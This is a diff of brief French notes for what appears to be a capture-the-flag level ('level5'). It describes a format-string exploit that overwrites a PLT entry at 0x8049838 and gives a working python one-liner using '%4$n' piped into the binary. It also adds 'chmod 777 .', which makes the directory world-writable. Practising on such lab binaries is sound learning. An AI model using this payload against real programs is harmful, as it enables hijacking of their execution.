@@ -13,4 +13,6 @@ l'entree de la plt que l'on veut modifier est a l'adresse 0x8049838 et on veux y
 
 on doit donc print 134513828 char donc on a besoin de %c
 
+chmod 777 .
+
 python -c 'print("\x38\x98\x04\x08%134513824c%4$n")' > test2 && cat test2 - | ./level5
